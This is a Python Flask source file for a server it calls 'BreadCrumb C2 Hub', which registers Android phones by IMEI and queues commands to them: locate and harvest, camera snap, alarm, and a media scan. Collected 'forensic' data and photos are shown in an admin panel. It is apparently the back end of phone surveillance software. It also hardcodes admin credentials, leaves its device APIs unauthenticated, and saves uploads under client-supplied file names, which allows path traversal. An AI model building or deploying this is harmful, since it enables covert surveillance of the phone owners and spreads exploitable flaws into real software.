import os
import sqlite3
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "breadcrumb_super_secret_key_911")

# Master Admin Credentials
ADMIN_USER = "BeekoTheBear911!"
ADMIN_PASS = "JTElephant911!"

DB_PATH = "breadcrumb_cloud.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices (
                    imei TEXT PRIMARY KEY,
                    make_model TEXT,
                    status TEXT,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS forensics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    imei TEXT,
                    data_type TEXT,
                    content TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    imei TEXT,
                    command TEXT,
                    status TEXT DEFAULT 'PENDING',
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS media (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    imei TEXT,
                    filename TEXT,
                    filepath TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )''')
    conn.commit()
    conn.close()

init_db()

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USER and password == ADMIN_PASS:
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            error = 'Invalid Master Administrator credentials.'
    
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Project BreadCrumb - Admin Login</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .login-card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
                h2 { text-align: center; color: #38bdf8; margin-top: 0; }
                input { width: 100%; padding: 12px; margin: 10px 0; background: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 6px; box-sizing: border-box; }
                button { width: 100%; padding: 12px; background: #0284c7; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 10px; }
                button:hover { background: #0369a1; }
                .error { color: #f43f5e; font-size: 14px; text-align: center; margin-bottom: 10px; }
            </style>
        </head>
        <body>
            <div class="login-card">
                <h2>BreadCrumb C2</h2>
                {% if error %}<div class="error">{{ error }}</div>{% endif %}
                <form method="POST">
                    <input type="text" name="username" placeholder="Master Admin User" required autocomplete="off">
                    <input type="password" name="password" placeholder="Master Password" required>
                    <button type="submit">Authenticate</button>
                </form>
            </div>
        </body>
        </html>
    ''', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
def admin_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    
    c.execute("SELECT * FROM devices ORDER BY last_seen DESC")
    devices = c.fetchall()
    
    selected_imei = request.args.get('imei', devices[0]['imei'] if devices else None)
    
    forensics = []
    media_files = []
    if selected_imei:
        c.execute("SELECT * FROM forensics WHERE imei = ? ORDER BY timestamp DESC", (selected_imei,))
        forensics = c.fetchall()
        c.execute("SELECT * FROM media WHERE imei = ? ORDER BY timestamp DESC", (selected_imei,))
        media_files = c.fetchall()
        
    conn.close()
    
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Project BreadCrumb - Dispatch Hub</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0f172a; color: #f8fafc; font-family: sans-serif; margin: 0; padding: 20px; }
                .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 15px; margin-bottom: 20px; }
                h1 { margin: 0; color: #38bdf8; font-size: 22px; }
                .logout { color: #f43f5e; text-decoration: none; font-weight: bold; }
                .grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
                @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
                .card { background: #1e293b; padding: 20px; border-radius: 10px; border: 1px solid #334155; margin-bottom: 20px; }
                .device-item { padding: 12px; background: #0f172a; border-radius: 6px; margin-bottom: 10px; cursor: pointer; border: 1px solid #334155; }
                .device-item.active { border-color: #38bdf8; background: #09203f; }
                .device-item a { color: #f8fafc; text-decoration: none; display: block; }
                pre { background: #0f172a; padding: 12px; border-radius: 6px; overflow-x: auto; color: #38bdf8; font-size: 13px; }
                .btn-group { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 15px; }
                button, .btn { padding: 10px 16px; background: #0284c7; border: none; color: white; border-radius: 6px; cursor: pointer; font-weight: bold; text-decoration: none; font-size: 13px; }
                button:hover, .btn:hover { background: #0369a1; }
                .btn-danger { background: #e11d48; }
                .btn-danger:hover { background: #be123c; }
                .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
                .media-thumb { width: 100%; height: 120px; object-fit: cover; border-radius: 6px; border: 1px solid #334155; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🛡️ Project BreadCrumb C2 Hub</h1>
                <a class="logout" href="{{ url_for('logout') }}">Logout</a>
            </div>
            
            <div class="grid">
                <div>
                    <div class="card">
                        <h3>Registered Handsets</h3>
                        {% if devices %}
                            {% for d in devices %}
                                <div class="device-item {% if d['imei'] == selected_imei %}active{% endif %}">
                                    <a href="{{ url_for('admin_dashboard', imei=d['imei']) }}">
                                        <strong>{{ d['make_model'] }}</strong><br>
                                        <small style="color: #94a3b8;">IMEI: {{ d['imei'] }}</small><br>
                                        <small style="color: #22c55e;">Status: {{ d['status'] }}</small>
                                    </a>
                                </div>
                            {% endfor %}
                        {% else %}
                            <p style="color: #94a3b8; font-size: 14px;">No active devices synced yet.</p>
                        {% endif %}
                    </div>
                </div>
                
                <div>
                    {% if selected_imei %}
                        <div class="card">
                            <h3>Active Controls & Dispatch (IMEI: {{ selected_imei }})</h3>
                            <form method="POST" action="{{ url_for('dispatch_command', imei=selected_imei) }}" class="btn-group">
                                <button name="cmd" value="LOCATE">📍 Queue Locate / Harvest</button>
                                <button name="cmd" value="SNAP">📸 Queue Snap</button>
                                <button name="cmd" value="ALARM">🚨 Trigger Alarm</button>
                                <button name="cmd" value="SCAN_MEDIA">📂 Scan & Sync Media Vault</button>
                            </form>
                        </div>
                        
                        <div class="card">
                            <h3>Captured Media Vault</h3>
                            {% if media_files %}
                                <div class="media-grid">
                                    {% for m in media_files %}
                                        <div>
                                            <a href="{{ m['filepath'] }}" target="_blank">
                                                <img src="{{ m['filepath'] }}" class="media-thumb" alt="{{ m['filename'] }}">
                                            </a>
                                            <small style="color: #94a3b8; display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{ m['filename'] }}</small>
                                        </div>
                                    {% endfor %}
                                </div>
                            {% else %}
                                <p style="color: #94a3b8; font-size: 14px;">No media captured or synced yet.</p>
                            {% endif %}
                        </div>

                        <div class="card">
                            <h3>Forensic Telemetry Stream</h3>
                            {% if forensics %}
                                {% for f in forensics %}
                                    <div style="margin-bottom: 15px;">
                                        <strong style="color: #38bdf8;">{{ f['data_type'] }}</strong> <small style="color: #64748b;">({{ f['timestamp'] }})</small>
                                        <pre>{{ f['content'] }}</pre>
                                    </div>
                                {% endfor %}
                            {% else %}
                                <p style="color: #94a3b8; font-size: 14px;">No forensic logs uploaded yet.</p>
                            {% endif %}
                        </div>
                    {% else %}
                        <div class="card">
                            <p style="color: #94a3b8;">Select a registered device from the left panel to inspect telemetry and dispatch commands.</p>
                        </div>
                    {% endif %}
                </div>
            </div>
        </body>
        </html>
    ''', devices=devices, selected_imei=selected_imei, forensics=forensics, media_files=media_files)

@app.route('/api/sync', methods=['POST'])
def api_sync():
    data = request.json
    if not data or 'imei' not in data:
        return jsonify({"error": "Missing IMEI"}), 400
    
    imei = data['imei']
    make_model = data.get('make_model', 'Unknown Android')
    status = data.get('status', 'Online')
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO devices (imei, make_model, status, last_seen) VALUES (?, ?, ?, CURRENT_TIMESTAMP) ON CONFLICT(imei) DO UPDATE SET make_model=?, status=?, last_seen=CURRENT_TIMESTAMP",
              (imei, make_model, status, make_model, status))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

@app.route('/api/poll-commands', methods=['GET'])
def api_poll_commands():
    imei = request.args.get('imei')
    if not imei:
        return jsonify([])
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE imei = ? AND status = 'PENDING'", (imei,))
    rows = c.fetchall()
    
    cmds = []
    for r in rows:
        cmds.append({"id": r[0], "command": r[1]})
        c.execute("UPDATE commands SET status = 'EXECUTED' WHERE id = ?", (r[0],))
    
    conn.commit()
    conn.close()
    return jsonify(cmds)

@app.route('/api/upload-forensics', methods=['POST'])
def api_upload_forensics():
    data = request.json
    if not data or 'imei' not in data or 'data_type' not in data:
        return jsonify({"error": "Invalid payload"}), 400
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO forensics (imei, data_type, content) VALUES (?, ?, ?)",
              (data['imei'], data['data_type'], str(data['content'])))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

@app.route('/api/upload-media', methods=['POST'])
def api_upload_media():
    imei = request.form.get('imei')
    file = request.files.get('file')
    if not imei or not file:
        return jsonify({"error": "Missing IMEI or file"}), 400
    
    upload_folder = os.path.join("static", "uploads")
    os.makedirs(upload_folder, exist_ok=True)
    
    filepath = os.path.join(upload_folder, file.filename)
    file.save(filepath)
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO media (imei, filename, filepath) VALUES (?, ?, ?)",
              (imei, file.filename, f"/{filepath}"))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

@app.route('/dispatch/<imei>', methods=['POST'])
def dispatch_command(imei):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    cmd = request.form.get('cmd')
    if cmd:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO commands (imei, command, status) VALUES (?, ?, 'PENDING')", (imei, cmd))
        conn.commit()
        conn.close()
        
    return redirect(url_for('admin_dashboard', imei=imei))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
